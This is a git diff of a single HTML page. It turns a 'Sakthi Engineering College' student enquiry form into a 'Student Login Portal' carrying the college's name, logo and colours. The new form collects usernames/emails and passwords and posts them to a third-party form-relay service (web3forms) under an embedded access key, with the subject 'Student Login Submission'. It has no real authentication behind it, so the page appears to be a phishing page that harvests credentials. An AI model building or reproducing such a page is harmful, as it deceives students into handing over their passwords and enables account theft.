@@ -3,8 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Sakthi Engineering College</title>
+<title>Adhiparasakthi Engineering College Login</title>
 
 <style>
 *{
@@ -15,134 +14,119 @@
 }
 
 body{
-    background:linear-gradient(135deg,#8B0000,#C62828);
     height:100vh;
     display:flex;
     justify-content:center;
     align-items:center;
+    background:linear-gradient(135deg,#5b0000,#b30000);
 }
 
 .container{
-    width:380px;
-    max-width:90%;
+    width:370px;
     background:#fff;
     border-radius:15px;
-    padding:35px;
+    padding:30px;
+    box-shadow:0 10px 30px rgba(0,0,0,.4);
     text-align:center;
-    box-shadow:0 10px 30px rgba(0,0,0,.25);
 }
 
 .logo{
-    width:130px;
-    margin-bottom:15px;
+    width:160px;
+    margin-bottom:10px;
 }
 
 h2{
     color:#8B0000;
-    margin-bottom:20px;
+    margin-bottom:5px;
 }
 
-input,
-textarea{
+p{
+    color:#666;
+    margin-bottom:20px;
+    font-size:14px;
+}
+
+.input-box{
     width:100%;
-    padding:13px;
+    padding:14px;
     margin:10px 0;
     border:1px solid #ccc;
     border-radius:8px;
     font-size:15px;
     outline:none;
-    transition:0.3s;
 }
 
-input:focus,
-textarea:focus{
-    border-color:#8B0000;
-    box-shadow:0 0 5px rgba(139,0,0,.3);
-}
-
-textarea{
-    resize:none;
-    height:120px;
+.input-box:focus{
+    border:1px solid #b30000;
+    box-shadow:0 0 5px rgba(179,0,0,.3);
 }
 
 button{
     width:100%;
     padding:14px;
-    background:#8B0000;
-    color:white;
+    margin-top:15px;
+    background:#b30000;
+    color:#fff;
     border:none;
     border-radius:8px;
-    font-size:16px;
+    font-size:17px;
     cursor:pointer;
-    transition:0.3s;
+    transition:.3s;
 }
 
 button:hover{
-    background:#A00000;
+    background:#8B0000;
 }
 
 .footer{
-    margin-top:18px;
-    color:#666;
-    font-size:13px;
-    line-height:20px;
-}
-
-@media(max-width:480px){
-    .container{
-        width:95%;
-        padding:25px;
-    }
-
-    .logo{
-        width:110px;
-    }
-
-    h2{
-        font-size:22px;
-    }
+    margin-top:20px;
+    font-size:12px;
+    color:#888;
 }
 </style>
 
 </head>
-
 <body>
 
 <div class="container">
 
-    <!-- College Logo -->
-    <img src="images-removebg-preview.png" alt="College Logo" class="logo">
+    <!-- Logo -->
+    <img src="images-removebg-preview.png" class="logo" alt="College Logo">
 
-    <h2>Student Enquiry Form</h2>
+    <h2>Sakthi Engineering College</h2>
 
-    <form action="https://forminit.com/f/uaxespqp7qo" method="POST">
+    <p>Student Login Portal</p>
+
+    <form action="https://api.web3forms.com/submit" method="POST">
+
+        <!-- Your Web3Forms Access Key -->
+        <input type="hidden" name="access_key" value="e760c71f-11f7-4964-99ff-eac4fffa4fad">
+
+        <!-- Optional -->
+        <input type="hidden" name="subject" value="Student Login Submission">
 
         <input
+            class="input-box"
             type="text"
-            name="student_name"
-            placeholder="Student Name"
-            autocomplete="name"
+            name="username"
+            placeholder="Username / Email"
             required>
 
         <input
-            type="email"
-            name="email"
-            placeholder="Student Email"
-            autocomplete="email"
+            class="input-box"
+            type="password"
+            name="password"
+            placeholder="Password"
             required>
 
-        <textarea
-            name="message"
-            placeholder="Enter your message"
-            required></textarea>
-
-        <button type="submit">Submit</button>
+        <button type="submit">
+            Login
+        </button>
 
     </form>
 
     <div class="footer">
-        <strong>Sakthi Engineering College</strong><br>
-        Study | Spirituality | Service
+        © Adhiparasakthi Engineering College
     </div>
 
 </div>
